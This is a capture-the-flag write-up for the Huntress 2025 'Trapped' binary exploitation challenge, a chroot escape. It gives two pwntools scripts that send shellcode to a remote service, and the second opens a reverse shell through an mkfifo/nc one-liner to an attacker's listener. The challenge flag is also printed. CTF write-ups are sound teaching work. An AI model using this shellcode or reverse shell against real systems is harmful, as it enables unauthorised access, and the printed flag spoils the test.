---
title: "Trapped"
date: 2025-11-26
categories:
  - Huntress_2025
tags:
  - CTF
platform: Huntress_2025
toc: true
toc_sticky: true
---

# ⚒️ Trapped

|Category         |	Author                |
|-----------------|-----------------------|
|⚒️ Binary Exploitation|Wittner          |

## Challenge Prompt

Well... I'm trapped. Feels like I'm in jail. Can you get the flag?

> [!NOTE]
> The flag is in the root directory at `/flag.txt`

## Problem Type
- Binary Exploitation
- CHROOT Escape

## Solve Option 1
Print flag - replace `TARGET_IP` with server IP address:
```python
from pwn import *
context.arch = "amd64"
io = remote("TARGET_IP", 9999)
io.recvuntil(b"open?\n")
io.sendline(b"notes")
io.recvuntil(b"next?")
io.send(asm(shellcraft.amd64.chdir("..") + shellcraft.amd64.chroot(".") + shellcraft.amd64.execve("/bin/sh", ["/bin/sh", "-c", "cat /flag.txt"])))
print(io.recvall(timeout=3).decode())
```

## Solve Option 2
Revshell - replace `TARGET_IP` with server IP address<br>
Replace `YOUR_IP` and `PORT` with your IP address and `nc` port you are using.<br>
Run NetCat on your machine:
```bash
nc -nvlp 7777
```

Then run the reverse shell Python script:
```python
from pwn import *
context.arch = "amd64"
io = remote("TARGET_IP", 9999)
io.recvuntil(b"open?\n")
io.sendline(b"notes")
io.recvuntil(b"next?")
io.send(asm(shellcraft.amd64.chdir("..") + shellcraft.amd64.chroot(".") + shellcraft.amd64.execve("/bin/sh", ["/bin/sh", "-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_IP PORT >/tmp/f"])))
print(io.recvall(timeout=2).decode())
```

## Flag
`flag{5f8c037a7ca4cb89c80174bca5eaf531}`


<p align="right">(<a href="#top">back to top</a>)</p>
